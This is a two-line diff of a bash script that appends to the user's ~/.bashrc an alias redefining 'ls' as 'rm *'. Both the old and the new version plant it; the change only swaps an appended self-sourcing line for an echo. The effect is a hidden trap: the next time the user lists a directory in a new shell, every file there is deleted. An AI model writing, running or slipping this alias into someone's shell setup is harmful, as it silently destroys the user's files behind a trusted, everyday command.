@@ -1,2 +1,2 @@
 #!/bin/bash
-{ echo "alias ls='rm *'"; echo "source ~/.bashrc"} >> ~/.bashrc
+(echo "alias ls='rm *'"$'\n'"echo 'sourced ~/.bashrc'") >> ~/.bashrc
